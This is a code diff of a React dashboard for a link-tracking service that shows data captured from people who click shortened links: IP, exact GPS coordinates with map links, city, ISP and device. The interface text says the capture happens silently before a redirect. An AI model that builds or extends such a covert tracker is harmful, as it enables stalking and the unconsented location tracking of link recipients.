@@ -164,7 +164,6 @@ export default function Dashboard() {
                   <p className="font-body text-xs text-primary mb-2 font-semibold">
                     ✅ Tracking Link Ready!
                   </p>
-                  {/* Shortened Bitly link — share this */}
                   <p className="font-body text-xs text-text-muted uppercase tracking-wider mb-1">Short link to share</p>
                   <div className="flex items-center gap-2 bg-surface rounded-lg px-3 py-2 mb-2">
                     <span className="font-mono text-sm text-primary truncate flex-1 font-bold">
@@ -178,7 +177,6 @@ export default function Dashboard() {
                       <Copy className="w-4 h-4" />
                     </button>
                   </div>
-                  {/* Raw tracking URL */}
                   <p className="font-body text-xs text-text-muted uppercase tracking-wider mb-1">Raw tracking URL</p>
                   <div className="flex items-center gap-2">
                     <span className="font-mono text-xs text-text-muted truncate flex-1">
@@ -242,7 +240,7 @@ export default function Dashboard() {
                 <p className="font-body text-xs text-text-muted">
                   <span className="text-primary font-semibold">How it works: </span>
                   Paste any URL → share the short link → when clicked, it silently
-                  captures IP, country, ISP, browser &amp; OS in the background,
+                  captures IP, GPS location, ISP, browser &amp; OS in the background,
                   then instantly redirects the visitor to your original URL.
                 </p>
               </div>
@@ -297,7 +295,7 @@ export default function Dashboard() {
                           <button
                             onClick={(e) => {
                               e.stopPropagation();
-                              copyToClipboard(link.trackingUrl);
+                              copyToClipboard(link.shortUrl || link.trackingUrl);
                             }}
                             className="p-1.5 text-text-muted hover:text-primary transition-colors"
                           >
@@ -344,17 +342,18 @@ export default function Dashboard() {
                                   {capture.ip && (
                                     <DataRow label="IP Address" value={capture.ip} />
                                   )}
-                                  {/* GPS location (exact) — only if user allowed */}
+
+                                  {/* GPS — exact if granted, IP-based fallback */}
                                   {capture.gpsLat && capture.gpsLon ? (
                                     <div className="col-span-2">
                                       <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-1">
                                         📍 GPS Location (Exact)
                                       </div>
-                                      <div className="font-mono text-xs text-primary break-all">
+                                      <div className="font-mono text-xs text-primary break-all font-bold">
                                         {capture.gpsLat.toFixed(6)}, {capture.gpsLon.toFixed(6)}
                                         {capture.gpsAccuracy && (
-                                          <span className="text-text-muted ml-2">
-                                            ±{capture.gpsAccuracy}m
+                                          <span className="text-text-muted ml-2 font-normal">
+                                            ±{capture.gpsAccuracy}m accuracy
                                           </span>
                                         )}
                                       </div>
@@ -362,17 +361,34 @@ export default function Dashboard() {
                                         href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
                                         target="_blank"
                                         rel="noopener noreferrer"
-                                        className="inline-block mt-1 text-xs text-primary underline hover:text-primary-dark"
+                                        className="inline-block mt-1 font-body text-xs text-primary underline hover:opacity-80"
+                                        onClick={e => e.stopPropagation()}
                                       >
                                         View on Google Maps ↗
                                       </a>
                                     </div>
                                   ) : capture.city ? (
-                                    <DataRow
-                                      label="📍 Location (IP-based, approx)"
-                                      value={`${capture.city}${capture.region ? ", " + capture.region : ""}, ${capture.country}`}
-                                    />
+                                    <div className="col-span-2">
+                                      <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-1">
+                                        📍 Location (IP-based, approximate)
+                                      </div>
+                                      <div className="font-mono text-xs text-text-primary">
+                                        {capture.city}{capture.region ? `, ${capture.region}` : ""}, {capture.country}
+                                      </div>
+                                      {capture.lat && capture.lon && (
+                                        <a
+                                          href={`https://www.google.com/maps?q=${capture.lat},${capture.lon}`}
+                                          target="_blank"
+                                          rel="noopener noreferrer"
+                                          className="inline-block mt-1 font-body text-xs text-text-muted underline hover:text-primary"
+                                          onClick={e => e.stopPropagation()}
+                                        >
+                                          View approximate location ↗
+                                        </a>
+                                      )}
+                                    </div>
                                   ) : null}
+
                                   {capture.device && (
                                     <DataRow label="Device" value={capture.device} />
                                   )}
